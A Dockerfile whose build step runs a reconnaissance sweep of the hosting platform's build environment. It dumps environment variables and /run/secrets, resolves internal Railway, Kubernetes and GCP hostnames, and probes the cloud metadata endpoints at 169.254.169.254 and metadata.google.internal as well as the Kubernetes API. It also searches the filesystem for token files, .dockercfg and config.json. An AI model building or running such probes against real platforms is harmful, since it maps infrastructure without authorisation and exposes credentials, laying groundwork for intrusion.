FROM alpine:3.19
RUN set -x \
 && echo "=== ENV ===" && env | sort \
 && echo "=== CGROUP ===" && cat /proc/1/cgroup \
 && echo "=== CAPS ===" && grep Cap /proc/self/status \
 && echo "=== MOUNTS ===" && mount | head -30 \
 && echo "=== RUN DIRS ===" && ls -la /run /var/run /run/secrets 2>&1 \
 && echo "=== HOSTS ===" && cat /etc/hosts \
 && echo "=== DNS LOOKUPS ===" && for h in metadata.google.internal kubernetes.default.svc backboard.railway.com railyard.internal.railway.com frontend.internal.railway.com api.railway.internal og.railway.internal; do getent hosts "$h" || echo "NX $h"; done \
 && echo "=== METADATA PROBES ===" && (curl -s -m 4 -o /dev/null -w "imds169: %{http_code}\n" http://169.254.169.254/ || echo "imds169: FAIL") \
 && (curl -s -m 4 -o /dev/null -w "gcp-meta: %{http_code}\n" http://metadata.google.internal/computeMetadata/v1/ || echo "gcp-meta: FAIL") \
 && (curl -s -m 4 -k -o /dev/null -w "k8s-api: %{http_code}\n" https://kubernetes.default.svc/ || echo "k8s-api: FAIL") \
 && (curl -s -m 4 -o /dev/null -w "loopback: %{http_code}\n" http://127.0.0.1:80/ || echo "loopback: FAIL") \
 && echo "=== NET ===" && (ip addr 2>/dev/null || true) && (ip route 2>/dev/null || true) \
 && echo "=== TOKEN-SHAPED FILES ===" && find / -maxdepth 3 \( -name "*token*" -o -name ".dockercfg" -o -name "config.json" \) 2>/dev/null | head -20 \
 && echo "=== BUILD DONE ==="
COPY app/ /app
CMD ["sh", "-c", "echo running; sleep 300"]
